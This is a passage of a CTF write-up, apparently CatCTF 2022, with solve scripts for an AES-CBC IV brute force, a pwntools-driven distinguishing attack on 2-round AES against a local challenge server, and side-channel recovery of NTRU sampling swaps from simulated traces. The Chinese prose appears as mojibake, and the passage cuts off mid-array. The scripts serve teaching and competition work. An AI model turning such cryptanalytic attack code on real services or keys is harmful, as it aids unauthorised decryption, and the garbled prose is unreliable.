c = tmp 
dat = [] 
msg = np.zeros([len(c), len(c[0])], dtype=int) 
getSpace() 
dat = sorted(dat)[::-1] 
for w, index, pos in dat:  
    infer(index, pos) 
    
print(''.join([''.join([chr(c) for c in x]) for x in msg])) 
```

#### çˆ†ç ´

çœ‹å¤§éƒ¨åˆ†äººç”¨çš„çˆ†ç ´è„šæœ¬éƒ½æ˜¯è¿™ä¸ªï¼Œä½†æ˜¯åªçˆ†ç ´äº†æœ€åä¸€ä½ï¼Œè›®å¥½å¥‡å‰é¢è¿™ä¸ªé­”æ•°æ€ä¹ˆå¾—åˆ°çš„ï¼Œæˆ–è®¸æ˜¯å› ä¸ºå‰è¾¹çˆ†ç ´å¤ªä¹…äº†æ‰€ä»¥ç¤ºæ„ä¸€ä¸‹ï¼Ÿhhhhhhï¼Œè°çŸ¥é“è¿™ä¸ªé­”æ•°ivæ€ä¹ˆçˆ†å‡ºæ¥çš„æ¬¢è¿cueæˆ‘ã€‚

```python
c = b64decode(c)
key = b64decode(key)
cipher=AES.new(key,mode=AES.MODE_ECB)
c2 = [c[i:i+16] for i in range(0,len(c),16)]
xor_s = []
xor_iv = b''
for c in c2:
    xor_s.append(cipher.decrypt(c))
    
s = b''

tiv = b'\xd4\x5d\x47\xaf\x96\xc5\xde\x2d\x96\x51\x6d\xf5\x3e\xe9\x30' 
for j in [0x99]:
    iv = tiv+long_to_bytes(j)
    tmpStr = ''
    for i in range(len(xor_s)):
        s = xor(xor_s[i], iv)
        iv = xor(s, c2[i])
        try:
            tmpStr += s.decode()
            if tmpStr[-1] not in printable:
                break
            tmpStr += '' # '\t'
        except:
            break
    if 'flag' in tmpStr:
        print(tmpStr)
```

### can you tell AES from blackboxï¼Ÿ

æœ¬é¢˜åŸå§‹å‡ºé¢˜èƒŒæ™¯æ˜¯AESçš„ä¸­é—´ç›¸é‡æ”»å‡»å’Œé™¤äº†ä¼ ç»Ÿå››ç§æ”»å‡»æ¨¡å‹ä¹‹å¤–çš„åŒºåˆ†æ”»å‡»æ¨¡å‹ï¼ŒåŸåˆçš„æƒ…å†µå¦‚ä¸‹ï¼š

![](Nepnep-CatCTF2022/2bdc710068ef3196000d8b30d162ec8_uPz1CghfKG.png)

![](Nepnep-CatCTF2022/d2773e673cf6376c245751929a5c245_VM31F-jptu.png)

![](Nepnep-CatCTF2022/10ca896f2d52bc0bdd192c8ce699324_c74Tfv_E_Q.png)

$C_{11}^{(2)}$åªä¸$t_{11}$åŠä¸€äº›ç”±å¯†é’¥å’Œæ˜æ–‡ä¸­çš„å¸¸æ•°å­—èŠ‚å†³å®šçš„å›ºå®šå€¼æœ‰å…³ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ ç”±a11åˆ°$ C_{11}^{(2)}  $çš„æ˜ å°„è¡¨ï¼Œå¯çŸ¥è¯¥è¡¨åªç”±c1å’Œc5ä¸¤ä¸ªæœªçŸ¥é‡ç¡®å®šï¼Œæ‰€ä»¥æ»¡è¶³æ¡ä»¶çš„æ˜ å°„è¡¨å…±æœ‰2^16ç§ï¼Œè€Œéšæœºæ˜ å°„æ¯æ¬¡æ˜æ–‡çš„æŸä¸ªå­—èŠ‚éƒ½æœ‰2^8ç§æ˜ å°„å¯èƒ½ï¼Œæ‰€ä»¥æä¾›äº†4æ¬¡æœºä¼šï¼Œéšæœºç½®æ¢æ€»å…±çš„å¯èƒ½æ€§åˆ™ä¸º2^32ç§ï¼Œäºæ˜¯å¯çŸ¥ï¼Œéšæœºç½®æ¢è½å…¥AESçš„å¯èƒ½æ€§ä¸º1/256ï¼Œå¯èƒ½æ€§è¾ƒå°ï¼Œæ‰€ä»¥å¯ä»¥ä½œä¸ºä¸€ä¸ªåŒºåˆ†æŒ‡æ ‡ã€‚

ä½†æ˜¯ä½œä¸ºä¼ ç»Ÿå¯†ç åˆ†æï¼Œé¢˜ç›®çš„ä¿¡æ¯é‡æ‘†åœ¨è¿™é‡Œï¼Œè§£ä¸æ˜¯å”¯ä¸€çš„ï¼Œåªè¦èƒ½è§£å†³ï¼Œé‚£å°±æ˜¯æ‰¾åˆ°äº†åˆç†çš„ç‰¹å¾ã€‚éšæœºç½®æ¢æ¨¡å‹æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æœ‰å¯èƒ½å¯¼è‡´æŸä¸ªå­—èŠ‚å˜åŒ–åï¼Œå…¶å¯¹åº”å­—èŠ‚çš„å€¼åè€Œæ²¡å˜ï¼Œè€Œæ ¹æ®ä¸Šå¼å¯çŸ¥ï¼Œè¿™ä¸ªæ˜ å°„åº”è¯¥æ˜¯ä¸€ä¸ªå•å°„ï¼Œæ‰€ä»¥å®é™…æˆ‘ä»¬ä½¿ç”¨çš„å…¶å®æ˜¯å¦ä¸€ä¸ªç›¸å…³çš„å¯†ç ç®—æ³•ï¼Œè§„é¿æ‰è¿™ä¸ªåŸºæœ¬çš„éšæœºç‰¹å¾ï¼ˆæ ¹æ®ç”Ÿæ—¥æ”»å‡»ï¼Œè¿™ä¸ªç‰¹å¾åœ¨ç»™å®šæ¨¡å‹æ˜¯a11éå†256æ—¶ï¼Œå¯¹äºåå‘åˆ¤æ–­æ˜¯æ›´è‡´å‘½çš„ï¼‰ã€‚

å› ä¸ºè¿™ä¸ªé¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥æœ€å¼€å§‹å‡ºé¢˜åœ¨æœ€å¤´éƒ¨åŠ å…¥äº†ä¸€è½®è½®å¯†é’¥åŠ ï¼Œå¹¶è®¾è®¡äº†ç›¸å…³çš„ç®—æ³•æ¥æ¢å¤ï¼Œä½†å› ä¸ºéº»çƒ¦ï¼Œè€Œä¸”æ‰“é€šç‡ä½äºé¢„æœŸï¼ˆå…¶å®åæ¥æ‰¾åˆ°äº†åŸå› ï¼Œä½†é¢˜ç›®å·²ç»æäº¤ä¸Šå»äº†ï¼Œåªèƒ½ä¸‹æ¬¡å†è¯´ï¼‰ï¼Œæ‰€ä»¥æœ€åé¢˜ç›®é™ä½éš¾åº¦ï¼Œæ¢å¤åŸçŠ¶ï¼Œå°†é¦–éƒ¨çš„è½®å¯†é’¥åŠ å»æ‰ï¼Œå³åªæ˜¯å°†éå†ä¸‹é™åˆ°4æ¬¡æœºä¼šï¼Œè¿™å°±å¯¼è‡´äº†ä»a11åˆ°t11çš„è¿‡ç¨‹æ˜¯æ•Œæ‰‹å¯æ§çš„ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘èƒ½æ§åˆ¶tï¼Œå°±ä¼šå‘ç°å½“tåªæœ‰æœ€åä¸€ä¸ªå­—èŠ‚å˜åŒ–æ—¶ï¼Œåªä¼šåœ¨æœ€åä¸€æ¬¡åˆ—æ··åˆé€ æˆæ‰©æ•£ï¼Œå‰é¢çš„12å­—èŠ‚éƒ½æ˜¯ç›¸åŒçš„ï¼Œé‚£ä¹ˆè¿™ä¹Ÿæ˜¯ä¸ªå¯è¡Œçš„åŒºåˆ†ç‰¹å¾ï¼Œä½†æ³›åŒ–æ€§ä¸å¦‚åŸæ€è·¯ï¼Œåœ¨å¤´éƒ¨åŠ å…¥è½®å¯†é’¥çš„æ—¶å€™å°±ä¼šå¤±æ•ˆã€‚

æ­¤å¤–è¿˜æœ‰å¸ˆå‚…åœ¨ä¸Šé¢çš„æ€è·¯ä¹‹å¤–åˆ©ç”¨å·®åˆ†å°†ç¬¬äºŒè½®çš„å¯†é’¥å½±å“æ¶ˆé™¤æ‰ï¼Œè¿™ä¸ªä¹Ÿæ˜¯å¸¸è§çš„trickï¼Œå¯ä»¥æŠŠä¸Šé¢çš„2^16çš„è¡¨è¿›ä¸€æ­¥ä¸‹é™åˆ°2^8çš„æ°´å¹³ã€‚ä½†è¿™ä½å¸ˆå‚…æ˜¯åœ¨åŒºåˆ†æ”»å‡»ä¹‹å¤–æ›´è¿›ä¸€æ­¥ï¼Œåšèµ·äº†å¯†é’¥æ¢å¤ï¼Œè¿™äºŒè€…è™½ç„¶å¯†ä¸å¯åˆ†ï¼Œä½†å¯¹äºåŒºåˆ†æ”»å‡»è€Œè¨€å¢åŠ äº†å·¥ä½œé‡ã€‚

æˆ‘çš„è„šæœ¬å¦‚ä¸‹ï¼š

```python
from pwn import *
from Crypto.Util.number import long_to_bytes,bytes_to_long
addRoundKey=lambda inp,key: xor(inp.rjust(16,b"\00"),long_to_bytes(key).rjust(16,b"\00"))
subBytes=lambda x,S:bytes([S[i] for i in x])
shiftRow=lambda S:[\
        S[0],S[4],S[8],S[12],\
        S[5],S[9],S[13],S[1],\
        S[10],S[14],S[2],S[6],\
        S[15],S[3],S[7],S[11]\
        ]
mul2=lambda x:(x<<1)^0b100011011 if x&0x80 else x<<1
mul3=lambda x:x^mul2(x)

mixColomn=lambda S:bytes(sum([[
                       mul2(S[i])^mul3(S[i+1])^S[i+2]^S[i+3],
                       S[i]^mul2(S[i+1])^mul3(S[i+2])^S[i+3],
                       S[i]^S[i+1]^mul2(S[i+2])^mul3(S[i+3]),
                       mul3(S[i])^S[i+1]^S[i+2]^mul2(S[i+3])
                       ] for i in range(0,16,4)],[]))
            
def AES_2r(inp,key,S):
        #c=addRoundKey(inp,key[0])
        c=subBytes(inp,S)
        c=shiftRow(c)
        c=mixColomn(c)
        c=addRoundKey(c,key[0])
        c=subBytes(c,S)
        c=shiftRow(c)
        c=mixColomn(c)
        c=addRoundKey(c,key[1])
        return c

S_BOX = [
             0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
             0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
             0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
             0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
             0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
             0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
             0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
             0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
             0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
             0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
             0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
             0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
             0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
             0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
             0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]
    

dic={}
for i in range(256):
    dic[i]=[mul2(S_BOX[mul2(S_BOX[0])^i])]
    for c in range(1,256):
        dic[i].append(mul2(S_BOX[mul2(S_BOX[c])^i])^dic[i][0])

from random import *
from pwn import *
p=remote("0.0.0.0",10001)
            
for i in range(20):
    p.recvline()
    c=bytes([randint(0,2**8-1)for i in range(16)])
    t=(((bytes([0])+c[1:16]).ljust(16,b"\00"))[:16])
    p.recvline()
    p.sendline(t)
    a=int(p.recvline()[6:],16)
    ans=[a>>120]
    for j in range(1,4):
        t=hex(((bytes([j])+c[1:16]).ljust(16,b"\00"))[:16])[2:]
        p.recvline()
        p.sendline(t)
        a=int(p.recvline()[6:],16)
        ans.append((a>>120)^ans[0])
    p.recvline()
    for k in range(256):
        if ans[1:4]==dic[k][1:4]:
            p.sendline(b"1")
            break
    else:
        p.sendline(b"0")
    p.recvline()    
    print(i)    
p.interactive()    
```

å› ä¸ºå‡ºé¢˜çš„æ—¶å€™å°±è¯„ä¼°åˆ°äº†ï¼Œæœ¬é¢˜æ‰€æä¾›çš„ä¿¡æ¯é‡å°±é‚£äº›ï¼Œæ”¶ä¸Šæ¥çš„wpè¿™å‡ ç§åšæ³•è™½ç„¶æœ‰å˜æ¢å­—èŠ‚çš„ä½ç½®å’Œå˜æ¢å­—èŠ‚çš„ç¯èŠ‚ä¸åŒï¼Œç”šè‡³æœ€åç¡®å®šçš„ç‰¹å¾æœ‰åŒºåˆ«ï¼Œä½†éƒ½æ˜¯ä¸‹æ”¾åˆ°äº†åˆé€‚çš„æ•°æ®å¤æ‚åº¦ï¼Œæ‰€ä»¥åªè¦æ˜¯æ„é€ åˆ°å…·ä½“å­—èŠ‚ä»è€Œé™ä½å¤æ‚åº¦è¿›è¡Œæ”»å‡»çš„æ–¹æ¡ˆéƒ½æ˜¯é¢„æœŸçš„ã€‚å¦‚æœæ˜¯å¤ç°ï¼Œè¿˜è¯·å„ä½å¸ˆå‚…å¤§èƒ†å°è¯•ä¸åŒçš„ä½ç½®ï¼Œå¸Œæœ›èƒ½å¸®åˆ°å„ä½åœ¨ä¼ ç»Ÿå¯¹ç§°å¯†ç ç®—æ³•åˆ†æçš„æƒ…æ™¯ä¸‹æ‰¾åˆ°æ–°çš„å…´è¶£ç‚¹ã€‚

### sample

è®ºæ–‡æ˜¯ä»Šå¹´çš„[Single-Trace Side-Channel Attacks on Ï‰-Small Polynomial Sampling: With Applications to NTRU, NTRU Prime, and CRYSTALS-DILITHIUM](https://ieeexplore.ieee.org/document/9702284 "Single-Trace Side-Channel Attacks on Ï‰-Small Polynomial Sampling: With Applications to NTRU, NTRU Prime, and CRYSTALS-DILITHIUM")ï¼Œä¸»è¦æ˜¯åˆ†æåœ¨ç®—æ³•é«˜æ–¯é‡‡æ ·é¢„å¤„ç†çš„è¿‡ç¨‹ä¸­å¯¹ä¸‰å…ƒå¤šé¡¹å¼çš„ç›´æ¥æ”»å‡»ï¼Œé™¤æ­¤ä¹‹å¤–åœ¨2018å¹´çš„å¦ä¸€ç¯‡è®ºæ–‡ä¸­ä¹Ÿæ¢è®¨äº†åœ¨æ­ç§˜ç¯èŠ‚ç›´æ¥æ”»å‡»ä¸‰å…ƒå¤šé¡¹å¼çš„ä¸€äº›æ–¹æ¡ˆï¼Œä½†å› ä¸ºæ—¶é—´è¾ƒä¸ºä¹…è¿œï¼Œå¯¹åº”çš„ä»£ç ä»“åº“æ²¡æœ‰äº†ï¼ŒçŒœæµ‹æ˜¯é‚£ç§å®ç°æœ€ç»ˆè¢«NTRUå®˜æ–¹banäº†ï¼Œæ‰€ä»¥æœ€åæ”¹æ¢äº†è¿™ç¯‡ã€‚

ä½¿ç”¨çš„ä»¿çœŸå·¥å…·æ˜¯[GitHub - sca-research/GILES](https://github.com/sca-research/GILES "GitHub - sca-research/GILES")ï¼Œç›¸æ¯”äºELMOä¼¼ä¹æ›´å¥½ä¸Šæ‰‹äº›ï¼ˆä»–æœ¬èº«åŸæ¥å°±å«ELMO2ï¼‰ï¼Œä½†æ˜¯æ²¡æœ‰åˆé€‚çš„å‡ºé¢˜æ ·ä¾‹äº†ï¼Œæ‰€ä»¥å€Ÿè¿™æ¬¡å†™ä¸ªå®Œæ•´çš„å·¥å…·ä½¿ç”¨æ–‡æ¡£ã€‚

GILESå¤„ç†çš„æ˜¯å¯ä»¥ç›´æ¥ç§»æ¤åˆ°arm cortex M0æœºå™¨ä¸Šçš„æŒ‡ä»¤ï¼Œä½†åŒæ—¶å› ä¸ºä»–æœ‰ä»¿çœŸæ‰€ç”¨çš„éƒ¨åˆ†å‡½æ•°ï¼Œä¹Ÿä¸èƒ½ç›´æ¥äº¤å‰ç¼–è¯‘ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ª[GitHub - sca-research/thumb-sim: Thumb Timing Simulator](https://github.com/sca-research/thumb-sim "GitHub - sca-research/thumb-sim: Thumb Timing Simulator")æ¥ç”Ÿæˆç¼–è¯‘æ–‡ä»¶ã€‚ä»¿çœŸå™¨çš„å‡½æ•°å¤´ä½¿ç”¨çš„æ˜¯[elmo-funcs.h download](https://github.com/sca-research/GILES/releases/download/1.1.0/elmo-funcs.h "elmo-funcs.h download")ï¼Œä¸»è¦åŒ…æ‹¬è§¦å‘å™¨ç›¸å…³çš„åŠŸèƒ½å’Œè¯»å†™å­—èŠ‚ç›¸å…³çš„åŠŸèƒ½ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å­—èŠ‚è¯»å†™ä¼¼ä¹éœ€è¦å¯¹é½åˆ°æŸä¸ªå€¼ï¼Œä¸ç„¶æ— æ³•è¯»å–ã€‚

åœ¨åˆ©ç”¨GILESç”Ÿæˆæ•°æ®çš„æ—¶å€™ï¼Œæœ‰ç”µæºæ¨¡å¼å’Œæ±‰æ˜é‡ä¸¤ç§é¢„è®¾æ¨¡å¼ï¼Œä½†å®é™…ä½“éªŒä¸‹æ¥ç”µæºæ¨¡å¼çš„æ•°æ®ç”Ÿæˆæ„Ÿè§‰æ¯”è¾ƒè‰ç‡ï¼Œä¸å¦‚ELMOçš„æ•°æ®çœ‹èµ·æ¥çœŸå®ï¼Œæ‰€ä»¥æˆ‘å‡ºé¢˜ä¸€èˆ¬æ˜¯ä½¿ç”¨hwæ¨¡å¼ã€‚btwä»–ä¹Ÿæä¾›æ¨¡å¼çš„è‡ªå®šä¹‰ï¼Œæƒ³ç€å¦‚æœæœ‰æœºä¼šèƒ½ä¸èƒ½æœç½—ä¸€ä¸‹å…¶ä»–çš„æ¨¡å¼åƒæ˜¯æ±‰æ˜è·å•¥çš„ï¼Œç„¶ååšä¸‹å¼€æºå¼€å‘è€…è¿™æ ·ã€‚

äº§ç”Ÿçš„æ•°æ®æ˜¯trsæ ¼å¼ï¼Œç”¨pythonçš„trsfileåº“å¯ä»¥è¯»å–ï¼Œä¸»è¦åŒ…æ‹¬æ•°æ®çš„é‡‡é›†è½¨è¿¹å’Œå¯¹åº”çš„æ³¨é‡Šæ•°æ®ï¼Œæ•´ä½“ç»“æ„è¿˜å¾ˆæ¸…æ™°ã€‚

NTRUå®ç°æœ‰å¾ˆå¤šç§ç‰ˆæœ¬ï¼Œå„æœ‰ç»†å¾®å·®å¼‚è¿˜éƒ½æ˜¯å®˜æ–¹çš„ã€‚ç¬¬ä¸‰è½®æäº¤æ–‡æ¡£ä¸­ä¸»è¦æ˜¯åˆ†ä¸ºsteam Primeè¿˜æ˜¯LPRrimeï¼Œä½†æ˜¯å®˜æ–¹çš„ä»£ç åˆåˆ†hpså’Œhrssä¸¤å¥—ç®—æ³•å®ç°ç‰ˆæœ¬ï¼Œå¯¹åº”çš„å‚æ•°ä¸å¤ªä¸€è‡´ï¼›é™¤æ­¤ä¹‹å¤–ä¹‹å‰çš„NTRU open projectå®ç°è¿˜æœ‰å…·ä½“å·®å¼‚ï¼Œä½†ä»£ç åˆ æ¡£äº†ï¼Œæ— ä»è€ƒè¯ã€‚è¿™æ¬¡å‡ºé¢˜æ¶‰åŠåˆ°sampleä¸»è¦æ˜¯åœ¨hpsä¸­ï¼Œhrssç³»åˆ—ä½¿ç”¨çš„é‡‡æ ·ä¸å®Œå…¨ä¸€è‡´ï¼Œå…ˆæ‰¾äº†ç›¸å¯¹å¥½å®ç°çš„ã€‚

NTRUä¸‰å…ƒå¤šé¡¹å¼é‡‡æ ·çš„æ•´ä½“æ€æƒ³æ˜¯ï¼Œå…ˆé‡‡æ ·å¤§é‡çš„éšæœºæ•°ï¼Œç„¶ååœ¨éšæœºæ•°åé™„åŠ 2bitçš„ä¸‰å…ƒä¿¡æ¯ï¼ˆ0ï¼Œ1ï¼Œ2ï¼Œå…¶ä¸­2ä»£è¡¨-1ï¼‰ï¼Œç„¶åå¯¹æ•°ç»„æ‰§è¡Œä¸€éç±»ä¼¼å¿«æ’çš„ç®—æ³•ï¼ˆä½†ä¹Ÿä¸å…¨æ˜¯ï¼Œæ„Ÿè§‰æœ‰ç‚¹å°å·®å¼‚ï¼‰ã€‚ä¸ºä¿è¯äº¤æ¢ä¸ä¼šäº§ç”Ÿæ˜æ˜¾çš„timingé—®é¢˜ï¼Œå¹¶æ›´åŠ è´´åˆç¡¬ä»¶æ‰§è¡Œï¼Œäº¤æ¢çš„ç®—æ³•æ¯”è¾ƒæœ‰æ„æ€ï¼šç”¨äº†ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„æ¯”è¾ƒç³»ç»Ÿï¼Œç„¶ååˆ©ç”¨å¼‚æˆ–çš„é€»è¾‘ï¼Œå¦‚æœä¸éœ€è¦äº¤æ¢é‚£ä¹ˆæ©ç ä¸º0ï¼Œæ•´ä½“éƒ½å¼‚æˆ–0ï¼Œäºæ˜¯ä¸äº¤æ¢ï¼›è€Œå¦‚æœéœ€è¦äº¤æ¢ï¼Œåˆ™å°†æ©ç è®¾ä¸ºå…¨1ï¼Œè¿™æ ·å°±å¯ä»¥ç•™ä¸‹a^bçš„ç»“æœï¼Œæ¯ä¸ªå€¼éƒ½å¼‚æˆ–ä»–ï¼Œè‡ªç„¶å°±å¾—åˆ°äº†äº¤æ¢çš„ç»“æœã€‚è¿™ä¸ªå†™æ³•è§„é¿äº†åˆ†æ”¯åˆ¤æ–­ä¼šå¸¦æ¥çš„æ—¶åºå·®å¼‚ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªæ©ç å…¨0è¿˜æ˜¯å…¨1æœ‰æ˜æ˜¾çš„æ±‰æ˜é‡å·®å¼‚ï¼Œæ‰€ä»¥å¯ä»¥çŒœæµ‹ä¼šæœ‰æ˜æ˜¾çš„å®é™…ç”µæºä¿¡å·å·®å¼‚ï¼ŒåŸä½œè€…çš„å®éªŒç»“æœä¹Ÿå¦‚æ˜¯ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯å‘ç°å¹¶è¿˜åŸè¿™ä¸€ç»„äº¤æ¢ä¿¡å·ï¼Œè‡ªç„¶å°±çŸ¥é“æ’åºåçš„ç§é’¥è¡¨è¾¾å¼å¦‚ä½•äº†ã€‚

ä½†å®é™…é‡åˆ°ä¸€äº›éš¾é‡‡æ ·çš„é—®é¢˜æ˜¯ï¼Œç”±äºæ ‡å‡†å®ç°ä¸­è¿™ä¸ªç½®æ¢æ˜¯é€šè¿‡å®å®šä¹‰å®ç°çš„ï¼Œè€Œè¿™æ®µä»£ç åˆæ˜¯ä¸€ä¸ªçº¯æ•°æ®æµä»£ç ï¼Œæ²¡ä»€ä¹ˆæ§åˆ¶æ€§çš„ä»£ç ï¼Œæ‰€ä»¥å…¶åˆ†ç•Œçº¿å¾ˆæ¨¡ç³Šï¼Œæ—¶é—´ç‰‡ä¹Ÿä¸ç¨³å®šï¼ˆå› ä¸ºç¨‹åºè°ƒç”¨ä¸­é—´æ—¶é—´å·®å¾ˆå¤šï¼Œæœ€çŸ­æœ€é•¿èƒ½å·®å‡ºä¸¤å€ï¼‰æˆ–è®¸é€šè¿‡ç”µæºæ¨¡å‹å¥½æ‰¾ç›¸å…³æ€§ï¼Œä½†æ˜¯åœ¨æ±‰æ˜é‡æ¨¡å‹ä¸‹å¤ªå®¹æ˜“å‡ºé”™äº†ï¼Œè€Œè¿™ä¸ªé¡ºåºåºåˆ—å¯¹è¯¯æŠ¥åˆå¾ˆä¸¥è‹›ï¼Œæ‰€ä»¥è¿™ä¹ˆå‡ºé¢˜ä¹Ÿå¤ªæŠ˜ç£¨é€‰æ‰‹äº†ï¼Œæ‰€ä»¥æœ€åå°†å®å®šä¹‰å†™æˆå‡½æ•°ï¼Œåˆ©ç”¨å‡½æ•°è°ƒç”¨æ˜¯å‹æ ˆè·³è½¬çš„æ§åˆ¶æµæ¥åšåˆ†ç•Œï¼Œæ–¹ä¾¿äº›ã€‚

ç†æ¸…è¿™ä¸ªæ€è·¯ï¼Œå¹¶ç†Ÿæ‚‰trsfileå’Œpltä¹‹åï¼Œå…¶å®å®é™…åšé¢˜å°±å¾ˆå®¹æ˜“äº†ï¼šå…ˆæ‰’å‚æ•°ï¼ˆä½¿ç”¨çš„æ˜¯æ¯”è¾ƒå°çš„åŸå§‹å‚æ•°N=251,q=256,p=3,d=72ï¼‰ï¼Œç„¶åé€šè¿‡å®˜æ–¹æºç è®¡ç®—æ•æ„Ÿäº¤æ¢éƒ¨åˆ†æ‰§è¡Œäº†å¤šå°‘æ¬¡ï¼Œç„¶ååœ¨trsä¸­å¤§èƒ†çŒœæµ‹ï¼ˆæŒ‡å·²çŸ¥æ•æ„Ÿä¿¡æ¯æ˜¯32å’Œ0ï¼Œé‚£ä¹ˆåœ¨ç¤ºä¾‹ä¸­å¯ä»¥çœ‹çœ‹æœ‰ä»€ä¹ˆæƒ…å†µï¼Œç”šè‡³è¯´æ ¹æ®é¢˜ç›®trsç›´æ¥çŒœé—´éš”ï¼Œæ¯•ç«Ÿæ€»æœ‰èƒ½è‚‰çœ¼åˆ†å¸ƒçš„è¿ç»­32çš„æ•°æ®ï¼Œæ¥åˆ¤æ–­æœ€å°è½®é—´éš”ï¼‰å°å¿ƒæ±‚è¯ï¼ˆæ—¢ç„¶çŸ¥é“è¿™ä¸ªé—´éš”æ˜¯å‡½æ•°è°ƒç”¨æ§åˆ¶æµå¼•èµ·çš„ï¼Œé‚£ä¹ˆå…¶ä»–åœ°æ–¹çš„å‡½æ•°è°ƒç”¨ä¼šä¸ä¼šå¯¼è‡´è¯¯æŠ¥ï¼Œæ˜¯ä¸æ˜¯è¿˜æœ‰å¯ä»¥å†åŒºåˆ†çš„ç‰¹å¾ï¼Ÿï¼‰ï¼Œç„¶åæ‰’å‡ºæ¥åºåˆ—ï¼Œå¡è¿›æºç ä¸­é­”æ”¹ä¸€ä¸‹å°±ç›´æ¥æ­£å‘è¿˜åŸäº†ï¼Œä¹Ÿæ²¡æœ‰å¤šå°‘é€†å‘è¦è¯»æ‡‚çš„éƒ¨åˆ†ã€‚

é¢˜ç›®å°†ä¸Šæ¶æ”»é˜²ä¸–ç•Œï¼Œä¸å†èµ˜è¿°ï¼Œå¯è§é™„ä»¶ã€‚

wpä»£ç ï¼š

```python
import numpy as np                                                        

import matplotlib.pyplot as plt                                           

from math import sqrt

import trsfile
task=trsfile.open('/home/zuni-w/Desktop/catctf/sample_wp/task.trs'  ,"r")
t=[i  for i in range(10,len(task[0])-2) if task[0][i-1]==0 and task[0][i] in {19,20,22} and task[0][i+1]==0 and task[0][i+2]==0 ]
n=[-1 if 32 in task[0][x:y] else 0 for x,y in zip(t,t[1:]+[-1])]
print(n)
```

C æºç 

```python
#include <stdio.h>
#include <stdint.h>
#define int32 int32_t

#define int32_MINMAX(a,b) \
do { \
  int32_t ab = (b) ^ (a); \
  int32_t c = ((b) - (a)); \
  c ^= ab & (c ^ (b)); \
  c >>= 31; \
  printf("%d,",c);\
  c = ab; \
  (a) ^= c; \
  (b) ^= c; \
  count++;  \  
} while(0)
int n[3773]=
{
-1, 0, -1, -1, -1, -1, -1, 0, 0, 0, 0, -1, -1, 0, -1, -1, 0, -1, -1, -1, -1, 0, 0, 0, -1, 0, 0, -1, 0, -1, 0, 0, -1, 0, -1, -1, -1, -1, -1, 0, 0, -1, 0, -1, 0, 0, 0, 0, 0, 0, 0, -1, -1, 0, 0, -1, 0, -1, -1, 0, -1, -1, -1, -1, -1, -1, -1, 0, 0, -1, -1, 0, 0, 0, 0, -1, -1, 0, -1, 0, 0, -1, -1, 0, -1, 0, 0, 0, 0, -1, 0, 0, -1, -1, 0, -1, 0, 0, 0, -1, 0, -1, 0, -1, -1, -1, -1, 0, 0, 0, 0, -1, 0, -1, -1, 0, -1, -1, 0, 0, 0, 0, 0, -1, 0, -1, -1, 0, -1, 0, -1, -1, -1, 0, -1, 0, -1, -1, 0, -1, -1, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, 0, -1, 0, -1, 0, -1, 0, -1, -1, 0, -1, 0, 0, -1, 0, 0, -1, -1, 0, -1, 0, -1, 0, -1, -1, -1, 0, -1, 0, 0, -1, -1, -1, 0, 0, 0, -1, 0, -1, -1, 0, 0, -1, -1, -1, 0, 0, -1, 0, 0, -1, 0, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, 0, 0, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, 0, 0, -1, -1, -1, 0, -1, 0, -1, -1, 0, 0, -1, -1, -1, 0, -1, -1, 0, -1, 0, 0, 0, 